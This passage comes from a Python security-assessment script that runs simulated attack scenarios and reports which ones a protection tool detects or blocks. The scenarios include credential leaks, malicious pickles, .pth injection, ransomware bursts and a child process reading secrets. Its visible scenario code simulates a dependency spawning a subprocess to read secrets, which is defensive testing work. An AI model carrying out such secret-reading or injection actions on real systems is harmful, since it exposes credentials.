            + "done = subprocess.run([sys.executable, '-c', " + child_literal + "], capture_output=True, text=True, env=child_env);" + chr(10)
            + "print('CHILD-RC', done.returncode, (done.stdout + done.stderr).strip()[-200:])"
        )
        guarded = subprocess.run([sys.executable, "-c", propagated_script], cwd=str(project), capture_output=True, text=True, timeout=180, env=env)
        escaped = "CHILD-RC 0" in plain.stdout
        blocked = "deny_sensitive_reads" in guarded.stdout or "blocked from reading" in guarded.stdout
        return Result(
            "A dependency spawns a Python child that reads secrets",
            "T1059",
            DETECTED if escaped or blocked else NOT_DETECTED,
            BLOCKED if blocked else NOT_PREVENTED,
            f"without propagation the child escaped: {escaped}; with propagation blocked: {blocked}; {guarded.stdout.strip()[:90]}",
            "2 - prevention (propagated)",
        )
    except Exception as exc:
        return Result("A dependency spawns a Python child that reads secrets", "T1059", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


def scenario_posture_reports_gaps() -> Result:
    root = Path(tempfile.mkdtemp(prefix="assess_posture_"))
    try:
        from tauhaulity.tools.posture import posture

        project = _project(root)
        report = posture(project)
        items = report.items
        outside = [item for item in items if item.section == "outside"]
        problems = report.problems()
        names = {item.name for item in items}
        ok = len(outside) == 5 and "pre_commit_hook" in names and all(item.state == "na" for item in outside)
        return Result(
            "A team cannot tell which controls are missing",
            "-",
            DETECTED if ok else NOT_DETECTED,
            "advisory only",
            f"{len(items)} item(s): {len(problems)} need attention, {len(outside)} outside scope",
            "1 - detection (operational honesty)",
        )
    except Exception as exc:
        return Result("A team cannot tell which controls are missing", "-", "-", "-", f"{type(exc).__name__}: {exc}", "-")
    finally:
        shutil.rmtree(root, ignore_errors=True)


SCENARIOS = (
    scenario_credential_in_tree,
    scenario_credential_in_history,
    scenario_git_gate,
    scenario_malicious_pickle_on_disk,
    scenario_pickle_loaded_at_runtime,
    scenario_pyc_tamper,
    scenario_venv_pth_injection,
    scenario_record_mismatch,
    scenario_honeytoken_read,
    scenario_canary_tamper,
    scenario_ransomware_burst,
    scenario_backup_tampering,
    scenario_undo_recovery,
    scenario_memory_tamper,
    scenario_exposed_listener,
    scenario_guarded_socket,
    scenario_guarded_subprocess,
    scenario_guarded_secret_read,
    scenario_typosquat_dependency,
    scenario_install_time_execution,
    scenario_quarantine_neutralises,
    scenario_deserialization_blocked,
    scenario_secret_blocked_on_the_wire,
    scenario_stale_feed_is_reported,
    scenario_child_process_contained,
    scenario_posture_reports_gaps,
)


def render(results: list[Result]) -> str:
    """Render the assessment as a fixed width table."""

    header = f"{'SCENARIO':<46}{'DETECTION':<22}{'PREVENTION':<26}TIER"
    lines = [header, "-" * len(header)]
    for item in results:
        lines.append(f"{item.scenario[:45]:<46}{item.detection[:21]:<22}{item.prevention[:25]:<26}{item.tier}")
    lines.append("")
    lines.append("Evidence:")
    for item in results:
        lines.append(f"  {item.scenario}: {item.evidence}")
        if item.technique:
            lines.append(f"    framework: {item.technique}")
    return chr(10).join(lines)


#: Prevention outcomes that mean the action really failed, was refused or was
#: undone. A checklist or an advisory is not prevention and is deliberately absent.
_PREVENTED = ("blocked", "refused before install", "recovered")


def summarize(results: list[Result]) -> dict[str, object]:
    """Return counters for the three capability tiers."""

    detected = sum(1 for item in results if item.detection == DETECTED)
    blocked = sum(1 for item in results if item.prevention in _PREVENTED)
    measured = sum(1 for item in results if item.detection not in {"skipped", "-"})
    return {
        "scenarios": len(results),
        "measured": measured,
        "detected": detected,
        "blocked_or_recovered": blocked,
        "detection_rate": round(detected / measured, 3) if measured else 0.0,
    }


def main(argv: list[str] | None = None) -> int:
    """Run every scenario and print the assessment."""

    parser = argparse.ArgumentParser(description="Measure detection and prevention honestly.")
    parser.add_argument("--json", action="store_true", help="emit machine readable results")
    args = parser.parse_args(argv)
    results = [scenario() for scenario in SCENARIOS]
    if args.json:
        print(json.dumps({"summary": summarize(results), "results": [asdict(item) for item in results]}, indent=2))
    else:
        print(render(results))
        print()
        print(json.dumps(summarize(results), indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
